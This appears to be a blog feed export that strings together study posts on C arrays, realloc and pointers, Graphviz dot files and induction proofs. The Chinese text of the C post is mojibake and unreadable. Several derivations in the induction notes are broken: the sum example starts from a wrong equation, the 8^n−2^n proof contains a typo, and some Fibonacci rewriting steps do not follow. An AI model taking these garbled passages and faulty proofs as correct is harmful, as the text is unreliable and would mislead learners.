ä¼šåˆ†é…ä¸€å—<strong>æ–°çš„å†…å­˜</strong>ï¼Œå¹¶<strong>å°†åŸå§‹æ•°æ®å¤åˆ¶åˆ°è¿™å—æ–°å†…å­˜</strong>ä¸­ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒåŸæ¥çš„æ•°æ®ä¹Ÿä¼šè¢«ä¿ç•™ï¼ˆåªè¦ realloc æˆåŠŸï¼‰ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æ–°çš„æŒ‡é’ˆè®¿é—®ã€‚<strong>å› æ­¤ä¸éœ€è¦è€ƒè™‘æ‰‹åŠ¨å¤åˆ¶å…ˆå‰æ•°æ®åˆ°æ–°åœ°å€çš„è¿‡ç¨‹</strong>ã€‚</p><pre><code>// æ‰©å±•æ•°ç»„int *new_array = realloc(array, 10 * sizeof(int)); // è¯•å›¾æ‰©å±•åˆ° 10 ä¸ª intif (new_array == NULL) &#123;    fprintf(stderr, &quot;Memory reallocation failed\n&quot;);    free(array); // å¦‚æœ realloc å¤±è´¥ï¼Œé‡Šæ”¾åŸå§‹å†…å­˜    return 1;&#125;array = new_array; // æ›´æ–°æŒ‡é’ˆ// åˆå§‹åŒ–æ–°åˆ†é…çš„å…ƒç´  for (int i = 5; i &lt; 10; i++) &#123; array[i] = i + 1; // èµ‹å€¼ 6, 7, 8, 9, 10 &#125;</code></pre><h2 id="ä¸¤ç§æ–¹å¼æ¯”è¾ƒ"><a href="#ä¸¤ç§æ–¹å¼æ¯”è¾ƒ" class="headerlink" title="ä¸¤ç§æ–¹å¼æ¯”è¾ƒ"></a>ä¸¤ç§æ–¹å¼æ¯”è¾ƒ</h2><h3 id="é™æ€æ•°ç»„"><a href="#é™æ€æ•°ç»„" class="headerlink" title="é™æ€æ•°ç»„"></a>é™æ€æ•°ç»„</h3><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><p>ç®€å•æ€§ï¼šå®šä¹‰å’Œä½¿ç”¨éå¸¸ç®€å•ï¼Œç›´æ¥åˆ†é…å†…å­˜å¹¶åœ¨<strong>æ ˆ</strong>ä¸Šç®¡ç†ï¼Œæ˜“äºç†è§£ã€‚<br>è¯­æ³•æ¸…æ™°ï¼Œç›´æ¥é€šè¿‡æ•°ç»„åå’Œç´¢å¼•è®¿é—®å…ƒç´ ã€‚</p><p>è‡ªåŠ¨å†…å­˜ç®¡ç†ï¼šé™æ€æ•°ç»„åœ¨æ ˆä¸Šåˆ†é…ï¼Œè‡ªåŠ¨ç®¡ç†å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ã€‚å½“è¶…å‡ºä½œç”¨åŸŸæ—¶ï¼Œå†…å­˜ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œå‡å°‘äº†å†…å­˜æ³„æ¼çš„é£é™©ã€‚</p><p>é€Ÿåº¦ï¼šåœ¨æ ˆä¸Šåˆ†é…å†…å­˜é€šå¸¸æ¯”åœ¨å †ä¸Šåˆ†é…æ›´å¿«ï¼Œå› ä¸ºæ ˆçš„å†…å­˜åˆ†é…å’Œé‡Šæ”¾æ˜¯é€šè¿‡æŒ‡é’ˆçš„ç§»åŠ¨å®ç°çš„ã€‚</p><h4 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h4><p>å¤§å°é™åˆ¶ï¼š<strong>æ•°ç»„çš„å¤§å°å¿…é¡»åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä¸èƒ½åŠ¨æ€è°ƒæ•´</strong>ã€‚å¦‚æœéœ€è¦æ›´å¤§çš„æ•°ç»„ï¼Œéœ€è¦æ‰‹åŠ¨ä¿®æ”¹ä»£ç å’Œé‡æ–°ç¼–è¯‘ã€‚</p><p><strong>æ ˆå†…å­˜æœ‰é™ï¼Œå¤§å‹æ•°ç»„å¯èƒ½å¯¼è‡´æ ˆæº¢å‡ºï¼ˆstack overflowï¼‰</strong>ã€‚</p><p>çµæ´»æ€§å·®ï¼šå¯¹äºéœ€è¦æ ¹æ®è¿è¡Œæ—¶æ¡ä»¶å˜åŒ–çš„æ•°ç»„ï¼Œé™æ€æ•°ç»„ä¸å¤Ÿçµæ´»ã€‚</p><h3 id="åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå¦‚-mallocï¼‰"><a href="#åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå¦‚-mallocï¼‰" class="headerlink" title="åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå¦‚ mallocï¼‰"></a>åŠ¨æ€å†…å­˜åˆ†é…ï¼ˆå¦‚ mallocï¼‰</h3><h4 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><p>çµæ´»æ€§ï¼š<strong>å¯ä»¥åœ¨è¿è¡Œæ—¶å†³å®šæ•°ç»„çš„å¤§å°ï¼Œé€‚åˆå¤„ç†ä¸ç¡®å®šå¤§å°çš„æ•°æ®</strong>ã€‚å¯ä»¥æ ¹æ®éœ€æ±‚åŠ¨æ€æ‰©å±•æ•°ç»„å¤§å°ã€‚</p><p>å†…å­˜ç®¡ç†ï¼š<strong>åœ¨å †ä¸Šåˆ†é…çš„å†…å­˜å¯ä»¥å®¹çº³æ¯”æ ˆæ›´å¤šçš„æ•°æ®ï¼Œé€‚åˆå¤§æ•°æ®é‡çš„å­˜å‚¨</strong>ã€‚</p><p>å…±äº«æ•°æ®ï¼šå¯ä»¥<strong>é€šè¿‡æŒ‡é’ˆå…±äº«åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸å¤šä¸ªå‡½æ•°è®¿é—®åŒä¸€å†…å­˜å—</strong>ã€‚</p><h4 id="ç¼ºç‚¹ï¼š"><a href="#ç¼ºç‚¹ï¼š" class="headerlink" title="ç¼ºç‚¹ï¼š"></a>ç¼ºç‚¹ï¼š</h4><p>å¤æ‚æ€§ï¼šåŠ¨æ€å†…å­˜ç®¡ç†éœ€è¦<strong>æ˜¾å¼è°ƒç”¨ mallocã€free ç­‰å‡½æ•°ï¼Œå¢åŠ äº†ç¼–ç¨‹å¤æ‚æ€§</strong>ã€‚<br><strong>éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼Œå®¹æ˜“å¼•å…¥å†…å­˜æ³„æ¼ï¼ˆæœªé‡Šæ”¾çš„å†…å­˜ï¼‰æˆ–æ‚¬ç©ºæŒ‡é’ˆï¼ˆæŒ‡å‘å·²é‡Šæ”¾å†…å­˜çš„æŒ‡é’ˆï¼‰</strong>ã€‚</p><p>æ€§èƒ½å¼€é”€ï¼šåŠ¨æ€åˆ†é…å†…å­˜çš„æ€§èƒ½é€šå¸¸ä½äºæ ˆä¸Šçš„åˆ†é…ï¼Œå› ä¸ºå †å†…å­˜ç®¡ç†æ¶‰åŠæ›´å¤šçš„æ“ä½œå’Œå¯èƒ½çš„ç¢ç‰‡åŒ–ã€‚<strong>æ¯æ¬¡è°ƒç”¨ malloc éƒ½æœ‰å¯èƒ½å½±å“æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨é¢‘ç¹åˆ†é…å’Œé‡Šæ”¾å†…å­˜æ—¶</strong>ã€‚</p><p>é”™è¯¯å¤„ç†ï¼š</p><p><strong>éœ€è¦æ£€æŸ¥ malloc è¿”å›çš„æŒ‡é’ˆæ˜¯å¦ä¸º NULLï¼Œä»¥å¤„ç†å†…å­˜åˆ†é…å¤±è´¥çš„æƒ…å†µã€‚</strong></p><h2 id="å…³äºè¶Šç•Œæ“ä½œï¼šè¶Šç•Œèµ‹å€¼å’Œè®¿é—®"><a href="#å…³äºè¶Šç•Œæ“ä½œï¼šè¶Šç•Œèµ‹å€¼å’Œè®¿é—®" class="headerlink" title="å…³äºè¶Šç•Œæ“ä½œï¼šè¶Šç•Œèµ‹å€¼å’Œè®¿é—®"></a>å…³äºè¶Šç•Œæ“ä½œï¼šè¶Šç•Œèµ‹å€¼å’Œè®¿é—®</h2><p>ä¸æ¨èè¶Šç•Œæ“ä½œï¼Œå› ä¸ºä¸è®ºæ˜¯å“ªç§åˆ†é…æ•°ç»„æ–¹å¼ï¼Œè¶Šç•Œèµ‹å€¼æˆ–è®¿é—®éƒ½ä¼šæœ‰å¤±è´¥çš„é—®é¢˜ã€‚</p><p>æ¯”å¦‚è¿™é‡Œå¯¹a[6] æ›´å¤šçš„å€¼è¿›è¡Œèµ‹å€¼</p><p><img src="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/2024-10-30-14-18-57.png" alt></p><p>è¶Šç•Œç¡®å®ä¼šèµ‹å€¼æˆåŠŸå‡ ä¸ªï¼Œä½†æ˜¯é‚£ä¸ª11å°±å¤±è´¥äº†ã€‚èµ‹å€¼å¤±è´¥</p><p><img src="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/2024-10-30-14-19-22.png" alt></p><p>ç›´æ¥è®¿é—®ã€æ‰“å°è¿™ä¸ªå€¼ä¹Ÿæ˜¯å¤±è´¥çš„ã€‚</p><p><img src="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/2024-10-30-14-19-40.png" alt></p><h2 id="æ•°ç»„é»˜è®¤å€¼"><a href="#æ•°ç»„é»˜è®¤å€¼" class="headerlink" title="æ•°ç»„é»˜è®¤å€¼"></a>æ•°ç»„é»˜è®¤å€¼</h2><p>å°±å½“é»˜è®¤å…¨æ˜¯ â€˜\0â€™å°±å¥½ç†è§£äº†ï¼Œ{â€˜0â€™}å’Œ{0}ä¸ä¸€æ ·</p><p>é»˜è®¤å…¨æ˜¯â€™\0â€™<br>char command[(FILE_NAME_LEN + 1) <em> 4] = {0};<br>char </em>nodeNames[NUM_OF_NODES] = {NULL};</p><p>åªæœ‰ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯â€™0â€™<br>char *nodeNames[NUM_OF_NODES] = {â€˜0â€™};</p><p>char array[10] = {â€˜aâ€™, â€˜bâ€™, â€˜câ€™}; // åªæœ‰å‰3ä¸ªå…ƒç´ è¢«èµ‹å€¼ï¼Œå…¶ä»–å…ƒç´ è¢«åˆå§‹åŒ–ä¸º â€˜\0â€™</p><h1 id="æ•°ç»„æŒ‡é’ˆåŠè®¿é—®æ–¹å¼"><a href="#æ•°ç»„æŒ‡é’ˆåŠè®¿é—®æ–¹å¼" class="headerlink" title="æ•°ç»„æŒ‡é’ˆåŠè®¿é—®æ–¹å¼"></a>æ•°ç»„æŒ‡é’ˆåŠè®¿é—®æ–¹å¼</h1><p>æ²¡æœ‰è´Ÿæ•°ä¸‹æ ‡çš„è®¿é—®æ–¹å¼ï¼Œä¸å¦‚py</p><p><code>arr[-1] in C</code></p><p>è®¿é—®åœ°å€</p><p><code>&amp;arr[0]</code></p><p><code>Arr+I</code> (iå¯ä»¥æ˜¯0  å¦‚arr+iæ˜¯ç¬¬iä¸ªå…ƒç´ çš„åœ°å€)</p><p>è®¿é—®å€¼</p><p><code>*(arr+i)</code></p><p><code>Arr[i]</code></p><h2 id="å­—ç¬¦æŒ‡é’ˆï¼ˆå­—ç¬¦ä¸²é¦–åœ°å€-å³å­—ç¬¦ä¸²æœ¬èº«-ï¼‰"><a href="#å­—ç¬¦æŒ‡é’ˆï¼ˆå­—ç¬¦ä¸²é¦–åœ°å€-å³å­—ç¬¦ä¸²æœ¬èº«-ï¼‰" class="headerlink" title="å­—ç¬¦æŒ‡é’ˆï¼ˆå­—ç¬¦ä¸²é¦–åœ°å€(å³å­—ç¬¦ä¸²æœ¬èº«)ï¼‰"></a>å­—ç¬¦æŒ‡é’ˆï¼ˆå­—ç¬¦ä¸²é¦–åœ°å€(å³å­—ç¬¦ä¸²æœ¬èº«)ï¼‰</h2><p>å­—ç¬¦ä¸²æœ¬èº«éšå¼çš„å†™äº†ä¸€ä¸ª<code>char[]</code>,ç„¶å<code>char*</code>çš„é¦–åœ°å€å¯ä»¥ç›´æ¥ä»¥æ•°ç»„å½¢å¼è®¿é—®ã€‚<br>æ•°å­—æ²¡æ³•åŠåˆ°è¿™ä¸€ç‚¹ã€‚</p><pre><code>#include &lt;stdio.h&gt;int main()&#123;    char *a = &quot;hello&quot;;    printf(&quot;%c\n&quot;, a[2]);    int b[] = &#123;1, 2, 3, 4, 5&#125;;    printf(&quot;%p\n&quot;, b);    return 0;&#125;</code></pre><p>æ›´è¯¦ç»†ä¸€äº›ï¼Œ<strong>åŒå¼•å·</strong>åŒ…è£¹çš„<strong>å­—ç¬¦ä¸²(æœ¬è´¨æ˜¯å­—ç¬¦æ•°ç»„)</strong>ï¼Œè¿”å›çš„å°±æ˜¯<strong>é¦–åœ°å€ï¼ˆæ—¢char*ï¼‰</strong></p><pre><code>char *argv[] = &#123; &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, NULL &#125;; // è¿™é‡Œæ˜¯åŒå¼•å·åŒ…è£¹çš„ï¼Œæ˜¯å­—ç¬¦ä¸²ä¸æ˜¯æ•°ç»„</code></pre><pre><code>char *cptr =&quot;CSE@UNSW&quot;;</code></pre><ul><li>argv[0] æ˜¯æŒ‡å‘å­—ç¬¦ä¸² â€œaâ€ çš„æŒ‡é’ˆï¼ˆå³ char*ï¼‰ï¼Œ</li><li>argv[1] æ˜¯æŒ‡å‘å­—ç¬¦ä¸² â€œbâ€ çš„æŒ‡é’ˆï¼Œ</li><li>argv[2] æ˜¯æŒ‡å‘å­—ç¬¦ä¸² â€œcâ€ çš„æŒ‡é’ˆã€‚</li></ul><h3 id="å¦‚å¤šåå­—æ•°ç»„èµ‹å€¼"><a href="#å¦‚å¤šåå­—æ•°ç»„èµ‹å€¼" class="headerlink" title="å¦‚å¤šåå­—æ•°ç»„èµ‹å€¼"></a>å¦‚å¤šåå­—æ•°ç»„èµ‹å€¼</h3><p><strong>â€œ0â€æ˜¯ç»™ char<em>çš„æ­£ç¡®æ–¹å¼ï¼Œâ€˜0â€™ ç»™char</em> ç›´æ¥æŠ¥é”™</strong></p><pre><code>// char *nodeNames[NUM_OF_NODES] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;&#125;;char *nodeNames[NUM_OF_NODES] = &#123;&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;&#125;;</code></pre><h2 id="ç»“æ„ä½“çš„æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥mallocå¤šä¸ªå½“ä½œæ•°ç»„ä½¿ç”¨"><a href="#ç»“æ„ä½“çš„æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥mallocå¤šä¸ªå½“ä½œæ•°ç»„ä½¿ç”¨" class="headerlink" title="ç»“æ„ä½“çš„æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥mallocå¤šä¸ªå½“ä½œæ•°ç»„ä½¿ç”¨"></a>ç»“æ„ä½“çš„æˆå‘˜å˜é‡æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥mallocå¤šä¸ªå½“ä½œæ•°ç»„ä½¿ç”¨</h2><pre><code>typedef long AdjMatrixElementTy;struct Graph&#123;AdjMatrixElementTy *pAdjMatrix;&#125;pGraph-&gt;pAdjMatrix = (AdjMatrixElementTy *) malloc(sizeof(AdjMatrixElementTy) * n * n);memset(pGraph-&gt;pAdjMatrix, 0, sizeof(AdjMatrixElementTy) * n * n);</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>prove floor&#39;s floor</title>
      <link href="/2024/10/28/Math/prove-floor-s-floor/"/>
      <url>/2024/10/28/Math/prove-floor-s-floor/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/28/Math/prove-floor-s-floor/r_2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dijkstra</title>
      <link href="/2024/10/27/Algorithm/Dijkstra/"/>
      <url>/2024/10/27/Algorithm/Dijkstra/</url>
      
        <content type="html"><![CDATA[<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E6%88%B4%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95">wiki Dijkstra (Chinese)</a></p><p><a href="https://www.bilibili.com/video/BV1uT4y1p7Jy">bilibili Dijkstra demon</a></p><p><a href="https://www.bilibili.com/video/BV1jE411W7tT">bilibili Dijkstra demon 2</a></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dot and graph</title>
      <link href="/2024/10/27/Algorithm/dot-and-graph/"/>
      <url>/2024/10/27/Algorithm/dot-and-graph/</url>
      
        <content type="html"><![CDATA[<h1 id="graphviz"><a href="#graphviz" class="headerlink" title="graphviz"></a>graphviz</h1><p><a href="https://graphviz.org/">Graphviz</a> is a open source visualization software. <code>dot</code> is a common command line of Graphviz suite. In COMP9024 of UNSW, we learn how to use <code>dot</code> to make directed or undirected graph.</p><h1 id="dot-filetype-undirected-and-directed-graph"><a href="#dot-filetype-undirected-and-directed-graph" class="headerlink" title="dot filetype, undirected and directed graph"></a>dot filetype, undirected and directed graph</h1><p>The .dot file format is used for defining graphs in a plain text language known as DOT language.</p><p>undirected graph:</p><pre><code>graph OurGraph &#123;    A -- B;    B -- C;    C -- A;&#125;</code></pre><p>directed graph:</p><pre><code>digraph OurDirectedGraph &#123;    A -&gt; B;    B -&gt; C;    C -&gt; A;&#125;</code></pre><p>In COMP9024, the lectures and tutors like to make the vertices redundent clarification in dot file:</p><pre><code>graph OurUndirectedGraph &#123;&quot;0&quot; -- &#123;&quot;2&quot;&#125;&quot;0&quot; -- &#123;&quot;3&quot;&#125;&quot;0&quot; -- &#123;&quot;4&quot;&#125;&quot;1&quot; -- &#123;&quot;2&quot;&#125;&quot;1&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;4&quot;&#125;&quot;2&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;6&quot;&#125;&quot;6&quot; -- &#123;&quot;7&quot;&#125;&quot;0&quot;&quot;1&quot;&quot;2&quot;&quot;3&quot;&quot;4&quot;&quot;5&quot;&quot;6&quot;&quot;7&quot;&#125;</code></pre><pre><code>graph OurUndirectedGraph &#123;&quot;0&quot; -- &#123;&quot;2&quot;&#125;&quot;0&quot; -- &#123;&quot;3&quot;&#125;&quot;0&quot; -- &#123;&quot;4&quot;&#125;&quot;1&quot; -- &#123;&quot;2&quot;&#125;&quot;1&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;4&quot;&#125;&quot;2&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;6&quot;&#125;&quot;6&quot; -- &#123;&quot;7&quot;&#125;&quot;0&quot;&quot;1&quot;&quot;2&quot;&quot;3&quot;&quot;4&quot;&quot;5&quot;&quot;6&quot;&quot;7&quot;&#125;</code></pre><h1 id="dot-command"><a href="#dot-command" class="headerlink" title="dot command"></a>dot command</h1><pre><code>dot -T png images/OurUndirectedGraph_0000.dot -o images/OurUndirectedGraph_0000.png# dot: This is the Graphviz command-line tool used to process DOT files.# -T png: Specifies the output format, in this case, PNG (portable network graphics). Graphviz supports other formats like SVG, PDF, and JPEG.# images/OurUndirectedGraph_0000.dot: This is the path to the input DOT file, which contains the graph definition.# -o images/OurUndirectedGraph_0000.png: Specifies the output file path and name for the generated image.</code></pre><h1 id="installation-on-Windows"><a href="#installation-on-Windows" class="headerlink" title="installation on Windows"></a>installation on Windows</h1><p>link: <a href="http://www.graphviz.org/download/">http://www.graphviz.org/download/</a></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Induction</title>
      <link href="/2024/10/26/Math/Induction/"/>
      <url>/2024/10/26/Math/Induction/</url>
      
        <content type="html"><![CDATA[<p>Lecture 12: Induction</p><ul><li><a href="#motivation">Motivation</a><ul><li><a href="#example">Example</a></li><li><a href="#inductive-reasoning">Inductive Reasoning</a></li><li><a href="#mathematical-induction">Mathematical Induction</a></li><li><a href="#induction-proof-structure">Induction proof structure</a></li></ul></li><li><a href="#basic-induction">Basic Induction</a><ul><li><a href="#example-1">example</a></li></ul></li><li><a href="#variations-on-basic-induction">Variations on Basic Induction</a><ul><li><a href="#induction-from-m-upwards">Induction From m Upwards</a><ul><li><a href="#example-2">Example</a></li></ul></li><li><a href="#induction-steps-â„“--1">Induction Steps â„“ > 1</a><ul><li><a href="#example-3">example</a></li></ul></li><li><a href="#strong-induction">Strong Induction</a><ul><li><a href="#example-4">Example</a></li></ul></li><li><a href="#negative-integers-backward-induction">Negative Integers, Backward Induction</a><ul><li><a href="#idea">Idea</a></li><li><a href="#example-am-gm-inequality">Example: AM-GM Inequality</a></li></ul></li></ul></li><li><a href="#structural-induction">Structural Induction</a><ul><li><a href="#example-induction-on-Ïƒ">Example: Induction on $Î£^âˆ—$</a></li><li><a href="#example-2-induction-on-Ïƒ">Example 2: Induction on $Î£^âˆ—$</a></li><li><a href="#example-3-induction-on-Ïƒ">Example 3: Induction on $Î£^âˆ—$</a></li><li><a href="#example-4-induction-on-more-complex-structures">Example 4: Induction on more complex structures</a></li><li><a href="#exercise">Exercise</a></li></ul></li></ul><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p><strong>Recursive datatypes</strong></p><p>Describe arbitrarily large objects in a finite way</p><p><strong>Recursive functions</strong></p><p>Define behaviour for these objects in a finite way</p><p><strong>Induction</strong></p><p>Reason about these objects in a finite way</p><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>Recall the recursive program:</p><p>Summing the first n natural numbers:</p><pre><code>sum(n): if(n = 0): 0 else: n + sum(n âˆ’1)</code></pre><p>Another attempt:</p><pre><code>sum2(n): return n âˆ—(n +1)/2</code></pre><p>Induction proof <strong>guarantees</strong> that these programs will behave the same.</p><h2 id="Inductive-Reasoning"><a href="#Inductive-Reasoning" class="headerlink" title="Inductive Reasoning"></a>Inductive Reasoning</h2><p>Suppose we would like to reach a conclusion of the form</p><script type="math/tex; mode=display">P(x) \text{ for all } x \text{( of some type)}</script><p>Inductive reasoning (as understood in philosophy) proceeds from examples.</p><p>E.g. From â€œThis swan is white, that swan is white, in fact every swan I have seen so far is whiteâ€ </p><p>Conclude: â€œEvery Swan is whiteâ€</p><p>Take Notice</p><p>This may be a good way to discover hypotheses.</p><p>But it is not a valid principle of reasoning!</p><p><strong>Mathematical induction</strong> is a variant that is valid.</p><h2 id="Mathematical-Induction"><a href="#Mathematical-Induction" class="headerlink" title="Mathematical Induction"></a>Mathematical Induction</h2><p>Mathematical Induction is based not just on a set of examples, but also a rule for deriving new cases of P(x) from cases for which P is known to hold.</p><p>General structure of reasoning by mathematical induction:</p><p><strong>Base Case [B]</strong>: $P(a_1),P(a_2),â€¦,P(a_n)$ for some small set of examples $a_1 â€¦ a_n$ (often n = 1)</p><p><strong>Inductive Step [I]</strong>: A general rule showing that if P(x) holds for some cases $x = x_1,â€¦,x_k$ then P(y) holds for some new case y, constructed in some way from $x_1,â€¦,x_k$.</p><p><strong>Conclusion</strong>: Starting with $a_1 â€¦ a_n$ and repeatedly applying the construction of y from existing values, we can eventually construct all values in the domain of interest.</p><h2 id="Induction-proof-structure"><a href="#Induction-proof-structure" class="headerlink" title="Induction proof structure"></a>Induction proof structure</h2><p>Let P(x) be the proposition that â€¦</p><p>We will show that P(x) holds for all x by induction on x.</p><p><strong>Base case</strong>: $x = â€¦$ :</p><ul><li>P(x): â€¦</li><li>â€¦.</li><li>so P(x) holds.</li></ul><p>[Repeat for all base cases]</p><p><strong>Inductive case</strong>: P(x) <strong>implies</strong> P(y)</p><ul><li>Assume P(x) holds. That is, â€¦.</li><li>We will show P(y) holds.</li><li>â€¦</li><li>So P(x) implies P(y).</li></ul><p>[Repeat for all inductive cases]</p><h1 id="Basic-Induction"><a href="#Basic-Induction" class="headerlink" title="Basic Induction"></a>Basic Induction</h1><p>Basic induction is the general principle applied to the natural numbers.</p><p><strong>Goal</strong>: Show P(n) holds for all $n âˆˆ \mathbb{N}$.</p><p><strong>Approach</strong>: Show that:</p><p><strong>Base case (B)</strong>: P(0) holds; and</p><p><strong>Inductive case (I)</strong>: If P(k) holds then P(k + 1) holds.</p><p><strong>Conclusion (C)</strong>: P(n) holds for all $n âˆˆ \mathbb{N}$.</p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>Let $P(n)$ be the proposition that: $\sum_{i=0}^{n} i=\frac{n(n+1)}{2}$</p><p>We will show that $P(n)$ holds for all $n âˆˆ \mathbb{N}$ by induction on n.</p><p><strong>[B] Base case</strong>: n = 0:</p><p>$\sum_{i=0}^{0} i=\frac{0(0+1)}{2}=0$</p><p>So P(0) holds.</p><p><strong>[I] Inductive case</strong>: $P(k) â‡’ P(k +1)$:</p><p>That is,</p><p>$\sum<em>{i=0}^{k} i= \frac{k(k+1)}{2} \implies \sum</em>{i=0}^{k+1} i=\frac{(k+1)(k+2)}{2}$?</p><p>proof:</p><script type="math/tex; mode=display">\sum_{i=0}^{k} i = \frac{(k+1)(k+2)}{2} \\(\sum_{i=0}^{k} i) + (k+1) = \frac{(k+1)(k+2)}{2} + (k+1) \\\therefore \sum_{i=0}^{k+1} i = (\sum_{i=0}^{k} i) + (k+1) \\= \frac{k(k+1)}{2} + (k+1) \\= \frac{k(k+1) + 2(k+1)}{2} \\= \frac{(k+1)(k+2)}{2}</script><p>Therefore P(k) implies P(k + 1).</p><p><strong>[C] Conclusion</strong>: We have P(0) is true, and P(k) implies P(k+1). Therefore, by induction, P(n) holds for all $n âˆˆ \mathbb{N}$.</p><h1 id="Variations-on-Basic-Induction"><a href="#Variations-on-Basic-Induction" class="headerlink" title="Variations on Basic Induction"></a>Variations on Basic Induction</h1><p>There are many variants of basic induction that may be more useful in certain circumstances. For example:</p><ol><li>Induction from m upwards</li><li>Induction steps &gt;1</li><li>Strong induction</li><li>Backward induction</li><li>Forward-backward induction</li><li>Structural induction</li></ol><h2 id="Induction-From-m-Upwards"><a href="#Induction-From-m-Upwards" class="headerlink" title="Induction From m Upwards"></a>Induction From m Upwards</h2><script type="math/tex; mode=display">If \\[B] \quad P(m)\\[I] \quad âˆ€k (â‰¥)m, P(k) â†’ P(k +1) \\then \\[C] \quad âˆ€n(â‰¥)m,P(n)</script><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p><strong>Theorem</strong>. For all $n â‰¥ 1$, the number $8^n âˆ’2^n$ is divisible by 6.</p><p><strong>[B]</strong> $8^1âˆ’2^1$ is divisible by 6</p><p><strong>[I]</strong> if $8^k âˆ’2^k$ is divisible by 6, then so is $8^{k+1} âˆ’ 2^{k+1}$, for all k â‰¥ 1</p><p>Prove [I] using the â€œtrickâ€ to rewrite $8^{k+1}$ as $8 Â· (8^k âˆ’ 2^k + 2^k)$ which allows you to apply the IH on $8^k âˆ’ 2^k$</p><script type="math/tex; mode=display">8^{k+1} âˆ’2^{k+1} = 8Â·(8^k âˆ’2^k +2^k)âˆ’2Â·2k \\= 8Â·(8^k âˆ’2^k)+8Â·2^k âˆ’2Â·2^k\\= 8Â·(8^k âˆ’2^k)+6Â·2^k</script><p>Note we have assume $(8^k âˆ’2^k)$ is divisible by 6. Hence the final expression is divisible by 6.</p><h2 id="Induction-Steps-â„“-gt-1"><a href="#Induction-Steps-â„“-gt-1" class="headerlink" title="Induction Steps â„“ &gt; 1"></a>Induction Steps â„“ &gt; 1</h2><script type="math/tex; mode=display">If \\[B] \quad P(m)\\[I] \quad P(k) â†’ P(k +â„“) \text{ for all } k â‰¥ m \\then \\[C] \quad P(n) \text{ for every } â„“â€™th \quad n â‰¥ m</script><h3 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h3><p>The Fibonacci numbers can be defined by the recurrence relation</p><script type="math/tex; mode=display">F_1 = 1,F_2 = 1</script><p>and</p><script type="math/tex; mode=display">F_n = F_{nâˆ’1} +F_{nâˆ’2}, for \quad n > 2</script><p>The first 12 Fibonacci numbers $F_n$ are:</p><p>1, 1, 2, <strong>3</strong>, 5, 8, 13, <strong>21</strong>, 34, 55, 89, <strong>144</strong></p><p><strong>Every 4th Fibonacci number is divisible by 3.</strong></p><p>[B] $F_4 =3$ is divisible by 3</p><p>[I] if $3 | F<em>k$, then $3 | F</em>{k+4}$, for all k â‰¥ 4</p><p>Prove [I] by rewriting $F_{k+4}$ in such a way</p><p>that you can apply the IH on $F_k$</p><script type="math/tex; mode=display">F_{k+4} =F_{k+3} +F_{k+2} \\=(F_{k+2} +F_{k+1}) + (F_{k+1} +F_{k}) \\=(F_{k+1} +F_{k}) + 2(F_{k} +F_{k-1}) +F_k \\=(F_{k} +F_{k-1}) + 4F_{k} + 2F_{k-1} \\=5F_{k} + 3F_{k-1}</script><h2 id="Strong-Induction"><a href="#Strong-Induction" class="headerlink" title="Strong Induction"></a>Strong 